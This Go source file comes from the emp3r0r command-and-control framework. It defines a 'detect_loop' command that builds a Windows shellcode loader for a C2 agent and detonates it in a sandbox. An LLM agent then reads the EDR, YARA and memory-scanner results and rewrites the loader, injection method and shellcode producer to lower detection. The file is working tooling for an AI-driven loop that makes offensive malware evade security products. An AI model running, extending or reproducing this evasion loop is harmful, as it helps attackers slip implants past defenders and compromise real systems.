package operator

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/detection"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/cli"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/spf13/cobra"
)

// detectLoopCmd starts the autonomous Norma detection loop as a detached child
// process. The console returns immediately; the child writes one log file and a
// separate tmux window tails it, leaving emp3r0r.log alone.
func detectLoopCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:     "detect_loop",
		GroupID: "agent",
		Short:   "Autonomously build, detonate, edit, and re-test loader_windows with Norma",
		Long: `Start the autonomous detection loop for loader_windows.

The command generates a real Go Windows agent shellcode when --shellcode is
omitted, then starts a detached worker. The worker builds the loader from
--module-dir, detonates it in LitterBox, and lets a Norma agent inspect the
SQLite telemetry, edit module source, rebuild, and compare payloads.

--shellcode accepts any x64 position-independent shellcode, so a Crystal
Palace/Crystal-Kit PICO produced by crystal_pack can replace the generated
Donut shellcode without changing the loader. Norma can change the loader,
wrapper, injection path, or shellcode producer when telemetry points at that
design.

The worker imports every saved LitterBox analyzer result: RedEdr, Moneta,
pe-sieve, HollowsHunter, HSB, Patriot, Blender, YARA, CheckPlz, HolyGrail, and
every EDR profile. Full feedback, builds, and per-payload telemetry stay in
SQLite. The worker writes only its instructions and bounded tool results to the
model context.

Set the model through the environment:
  EMP3R0R_DETECTION_PROVIDER=openai-responses
  EMP3R0R_DETECTION_MODEL=<model>
  EMP3R0R_DETECTION_BASE_URL=<url>
  OPENAI_API_KEY=<key>`,
		Example: "detect_loop --module-dir /path/to/core/modules/loader_windows --iterations 3",
		Args:    cobra.NoArgs,
		Run:     runDetectLoopCommand,
	}
	cmd.Flags().String("module-dir", "", "Module source directory (default: the installed loader_windows path)")
	cmd.Flags().String("shellcode", "", "x64 PIC shellcode (Donut, Crystal Palace PICO, ...); generated when omitted")
	cmd.Flags().String("agent-type", builder.PayloadTypeWindowsExecutable, "Agent payload type to generate")
	cmd.Flags().String("arch", "amd64", "Agent architecture")
	cmd.Flags().String("cc", "", "C2 address for the generated agent; defaults to the current config")
	cmd.Flags().String("sandbox", "", "LitterBox URL; defaults to EMP3R0R_DETECTION_SANDBOX or 127.0.0.1:1337")
	cmd.Flags().Int("iterations", 3, "Maximum detection cycles, including the baseline")
	cmd.Flags().StringSlice("stages", []string{"static", "dynamic"}, "Stages to run")
	cmd.Flags().String("process", "", "Override the sacrificial process; empty uses the module default")
	cmd.Flags().String("format", "exe", "Loader host format: exe, service, or dll")
	cmd.Flags().String("inject", "apc", "Injection method: apc or ct")
	cmd.Flags().String("smw", "on", "SilentMoonwalk: on or off")
	cmd.Flags().Int("turns", 60, "Maximum Norma agent turns")
	cmd.Flags().Duration("timeout", 0, "Worker deadline; 0 means no deadline")
	cmd.Flags().Bool("tmux", true, "Open a separate tmux window tailing the loop log")
	return cmd
}

type detectLoopOptions struct {
	ModuleDir  string
	Shellcode  string
	AgentType  string
	Arch       string
	CC         string
	Sandbox    string
	Iterations int
	Stages     []string
	Process    string
	Format     string
	Inject     string
	SMW        string
	Turns      int
	Timeout    time.Duration
	Tmux       bool
}

func runDetectLoopCommand(cmd *cobra.Command, _ []string) {
	opts := detectLoopOptions{}
	opts.ModuleDir, _ = cmd.Flags().GetString("module-dir")
	opts.Shellcode, _ = cmd.Flags().GetString("shellcode")
	opts.AgentType, _ = cmd.Flags().GetString("agent-type")
	opts.Arch, _ = cmd.Flags().GetString("arch")
	opts.CC, _ = cmd.Flags().GetString("cc")
	opts.Sandbox, _ = cmd.Flags().GetString("sandbox")
	opts.Iterations, _ = cmd.Flags().GetInt("iterations")
	opts.Stages, _ = cmd.Flags().GetStringSlice("stages")
	opts.Process, _ = cmd.Flags().GetString("process")
	opts.Format, _ = cmd.Flags().GetString("format")
	opts.Inject, _ = cmd.Flags().GetString("inject")
	opts.SMW, _ = cmd.Flags().GetString("smw")
	opts.Turns, _ = cmd.Flags().GetInt("turns")
	opts.Timeout, _ = cmd.Flags().GetDuration("timeout")
	opts.Tmux, _ = cmd.Flags().GetBool("tmux")

	if opts.AgentType != builder.PayloadTypeWindowsExecutable && opts.AgentType != builder.PayloadTypeWindowsDLL {
		logging.Errorf("detect_loop: agent type must be %s or %s", builder.PayloadTypeWindowsExecutable, builder.PayloadTypeWindowsDLL)
		return
	}
	if opts.Arch != "amd64" {
		logging.Errorf("detect_loop: loader_windows is built for amd64; use --arch amd64")
		return
	}
	if opts.ModuleDir == "" {
		if mod, ok := def.GetModule("loader_windows"); ok && mod != nil {
			opts.ModuleDir = mod.Path
		}
	}
	if opts.ModuleDir == "" {
		logging.Errorf("detect_loop: pass --module-dir or install loader_windows")
		return
	}
	if info, err := os.Stat(opts.ModuleDir); err != nil || !info.IsDir() {
		logging.Errorf("detect_loop: module directory %q is not readable", opts.ModuleDir)
		return
	}

	logDir := filepath.Join(live.EmpWorkSpace, "detection")
	if err := os.MkdirAll(logDir, 0o700); err != nil {
		logging.Errorf("detect_loop: create log directory: %v", err)
		return
	}
	logPath := filepath.Join(logDir, "detect-loop-"+time.Now().UTC().Format("20060102-150405")+".log")
	logFile, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		logging.Errorf("detect_loop: open log: %v", err)
		return
	}
	logf := func(format string, args ...any) {
		fmt.Fprintf(logFile, "%s %s\n", time.Now().UTC().Format("15:04:05"), fmt.Sprintf(format, args...))
	}

	if opts.Tmux {
		window, tmuxErr := cli.TmuxNewPane("Detection Loop", "", "", 0,
			"tail -F "+shellQuotePath(logPath))
		if tmuxErr != nil {
			logging.Warningf("detect_loop: tmux window: %v", tmuxErr)
		} else {
			logging.Infof("Detection loop log: %s (tmux %s)", logPath, window.ID)
		}
	}
	if !detection.ModelConfigured() {
		logging.Errorf("detect_loop: no detection model configured; set EMP3R0R_DETECTION_MODEL and OPENAI_API_KEY or ANTHROPIC_API_KEY")
		logf("no detection model configured; set EMP3R0R_DETECTION_MODEL and the provider API key")
		return
	}
	loopID := "loop-" + time.Now().UTC().Format("20060102-150405")
	logging.Infof("Detection loop started; log: %s", logPath)

	go func() {
		shellcode := strings.TrimSpace(opts.Shellcode)
		if shellcode == "" {
			logf("generating real Go agent shellcode (%s/%s)", opts.AgentType, opts.Arch)
			generated, genErr := generateAgentShellcode(opts, logf)
			if genErr != nil {
				logf("shellcode generation failed: %v", genErr)
				return
			}
			shellcode = generated
			logf("generated shellcode: %s", shellcode)
		}
		if err := startDetectLoopWorker(opts, shellcode, loopID, logFile, logf); err != nil {
			logf("worker start failed: %v", err)
		}
	}()
}

func generateAgentShellcode(opts detectLoopOptions, logf func(string, ...any)) (string, error) {
	agentCfg := builder.AgentConfig{}
	if strings.TrimSpace(opts.CC) != "" {
		cc := strings.TrimSpace(opts.CC)
		agentCfg.CCAddress = &cc
	}
	// Try a C2-signed agent first; the sandbox does not check in, so a local
	// build without a signature is still a real Go agent for detection.
	res, err := builder.GenerateAgentWorkflow(agentCfg, opts.AgentType, opts.Arch, client.SignAgent)
	if err != nil {
		logf("signed generation failed (%v); building without a C2 signature", err)
		res, err = builder.GenerateAgentWorkflow(agentCfg, opts.AgentType, opts.Arch, nil)
	}
	if err != nil {
		return "", err
	}
	if res.ShellcodeErr != nil {
		return "", res.ShellcodeErr
	}
	if strings.TrimSpace(res.ShellcodeFile) == "" {
		return "", fmt.Errorf("agent build produced no shellcode")
	}
	return res.ShellcodeFile, nil
}

func startDetectLoopWorker(opts detectLoopOptions, shellcode, loopID string, logFile *os.File, logf func(string, ...any)) error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("resolve executable: %w", err)
	}
	args := []string{
		"detect-loop-worker",
		"--module", "loader_windows",
		"--module-dir", opts.ModuleDir,
		"--shellcode", shellcode,
		"--sandbox", opts.Sandbox,
		"--iterations", strconv.Itoa(opts.Iterations),
		"--stages", strings.Join(opts.Stages, ","),
		"--process", opts.Process,
		"--format", opts.Format,
		"--inject", opts.Inject,
		"--smw", opts.SMW,
		"--turns", strconv.Itoa(opts.Turns),
		"--timeout", opts.Timeout.String(),
		"--loop-id", loopID,
	}
	worker := exec.Command(exe, args...)
	worker.Stdout = logFile
	worker.Stderr = logFile
	detachWorker(worker)
	if err := worker.Start(); err != nil {
		return fmt.Errorf("start worker: %w", err)
	}
	logf("worker pid=%d; log=%s", worker.Process.Pid, logFile.Name())
	go func() {
		defer logFile.Close()
		waitErr := worker.Wait()
		reportPath := filepath.Join(live.EmpWorkSpace, "detection", "reports", loopID+".md")
		if report, readErr := os.ReadFile(reportPath); readErr == nil {
			logging.Successf("Detection loop report: %s", reportPath)
			logging.Infof("%s", report)
			logf("final report printed from %s", reportPath)
			return
		}
		if waitErr != nil {
			logging.Errorf("Detection loop failed; see %s: %v", logFile.Name(), waitErr)
			logf("worker exited: %v", waitErr)
		} else {
			logging.Warningf("Detection loop finished without a report; see %s", logFile.Name())
			logf("worker exited cleanly without a report")
		}
	}()
	return nil
}

func shellQuotePath(path string) string {
	return "'" + strings.ReplaceAll(path, "'", `'\''`) + "'"
}

// RunDetectLoopWorker is the detached worker entry point. It does not start the
// C2 client, MCP, or tmux; it only builds, detonates, and edits.
func RunDetectLoopWorker(ctx context.Context, cfg detection.EvolveConfig) error {
	cfg.Logf = func(line string) {
		fmt.Fprintf(os.Stdout, "%s %s\n", time.Now().UTC().Format("15:04:05"), line)
	}
	_, err := detection.RunEvolve(ctx, cfg)
	return err
}
